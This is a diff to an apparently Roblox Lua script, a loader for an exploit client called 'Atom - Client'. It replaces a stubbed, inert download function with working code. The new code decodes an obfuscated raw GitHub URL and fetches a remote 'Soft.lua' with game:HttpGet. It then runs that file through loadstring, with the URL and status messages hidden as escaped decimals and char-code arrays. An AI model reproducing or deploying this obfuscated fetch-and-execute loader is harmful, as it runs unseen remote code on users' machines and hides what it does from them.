@@ -53,50 +53,57 @@
 ⠀⠀⠀⢹⣿⣵⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣯⡁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ]]
 
-local a = "\\104\\116\\116\\112\\115\\58\\47\\47\\114\\97\\119\\46\\103\\105\\116\\104\\117\\98\\46\\99\\111\\109\\47\\115\\100\\102\\51\\50\\55\\51\\101\\100\\51\\56\\101\\121\\50\\51\\56\\100\\51\\50\\56\\100\\50\\51\\117\\100\\57\\106\\51\\56\\57\\100\\117\\50\\51\\106\\100\\47\\50\\102\\52\\53\\55\\104\\107\\100\\51\\50\\51\\97\\116\\111\\109\\47\\109\\97\\105\\110\\47\\83\\111\\102\\116\\46\\108\\117\\97"
-
-local function b(b1)
-    local b2, b3, b4, b5 = "", 1, nil, nil
-    while b3 ~= "" do
-        b3, b4, b5 = b1:match("^(.-)(\\(%d+))", b3 and b3:len() + 1 or 1)
-        b2 = b2 .. b3 .. (b5 and string.char(tonumber(b5)) or "")
-    end
-    return b2
-end
-
-local function c(c1)
-    local c2 = {game = {HttpGet = function(_, url) return end}}
-    local c3, c4 = nil, nil
-    local function c5(c6)
-        c4 = c2.game:HttpGet(c6)
-        if c4 then
-            local c7 = {76, 97, 117, 110, 99, 104, 105, 110, 103, 32, 65, 116, 111, 109, 32, 45, 32, 67, 108, 105, 101, 110, 116}
-            local c8 = ""
-            for c9 = 1, #c7 do c8 = c8 .. string.char(c7[c9]) end
-            warn(c8)
-            c4()
+local z1 = "\\104\\116\\116\\112\\115\\58\\47\\47\\114\\97\\119\\46\\103\\105\\116\\104\\117\\98\\46\\99\\111\\109\\47\\115\\100\\102\\51\\50\\55\\51\\101\\100\\51\\56\\101\\121\\50\\51\\56\\100\\51\\50\\56\\100\\50\\51\\117\\100\\57\\106\\51\\56\\57\\100\\117\\50\\51\\106\\100\\47\\50\\102\\52\\53\\55\\104\\107\\100\\51\\50\\51\\97\\116\\111\\109\\47\\109\\97\\105\\110\\47\\83\\111\\102\\116\\46\\108\\117\\97"
+local function z2(z3)
+    local z4, z5 = "", 1
+    while z5 <= #z3 do
+        local z6 = z3:sub(z5, z5):byte()
+        if z6 == 92 then
+            local z7 = z3:sub(z5+1):match("(%d+)")
+            z4 = z4 .. string.char(tonumber(z7))
+            z5 = z5 + #z7 + 1
         else
-            local c10 = {67, 97, 110, 39, 116, 32, 108, 111, 97, 100, 32, 65, 116, 111, 109, 32, 45, 32, 67, 108, 105, 101, 110, 116}
-            local c11 = ""
-            for c12 = 1, #c10 do c11 = c11 .. string.char(c10[c12]) end
-            warn(c11)
+            z4 = z4 .. z3:sub(z5, z5)
         end
+        z5 = z5 + 1
     end
-    c5(c1)
+    return z4
 end
-
-local d = (function(e)
-    return function(f)
-        local g = b(f)
-        if g then
-            c(g)
-        else
-            local h = {67, 97, 110, 39, 116, 32, 108, 111, 97, 100, 32, 65, 116, 111, 109, 32, 45, 32, 67, 108, 105, 101, 110, 116, 46}
-            local i = ""
-            for j = 1, #h do i = i .. string.char(h[j]) end
-            warn(i)
-        end
+local function z8(z9)
+    local function za(zb)
+        local zc = game:HttpGet(zb)
+        return zc and loadstring(zc) or function() end
     end
-end)()
-
-d(a)
+    local zd = za(z9)
+    if zd then
+        (function() 
+            local ze = {76, 97, 117, 110, 99, 104, 105, 110, 103, 32, 65, 116, 111, 109, 32, 45, 32, 67, 108, 105, 101, 110, 116}
+            local zf = ""
+            for zg = 1, #ze do
+                zf = zf .. string.char(ze[zg])
+            end
+            warn(zf)
+        end)() 
+        zd()
+    else
+        (function()
+            local zh = {67, 97, 110, 39, 116, 32, 108, 111, 97, 100, 32, 65, 116, 111, 109, 32, 45, 32, 67, 108, 105, 101, 110, 116}
+            local zi = ""
+            for zj = 1, #zh do
+                zi = zi .. string.char(zh[zj])
+            end
+            warn(zi)
+        end)()
+    end
+end
+local zk = (function() return z2(z1) end)
+local zl = (function() return z8(zk()) end)
+local zm = (function() if zk() then return zl() else (function()
+    local zn = {67, 97, 110, 39, 116, 32, 108, 111, 97, 100, 32, 65, 116, 111, 109, 32, 45, 32, 67, 108, 105, 101, 110, 116, 46}
+    local zo = ""
+    for zp = 1, #zn do
+        zo = zo .. string.char(zn[zp])
+    end
+    warn(zo)
+end)() end end)
+zm()
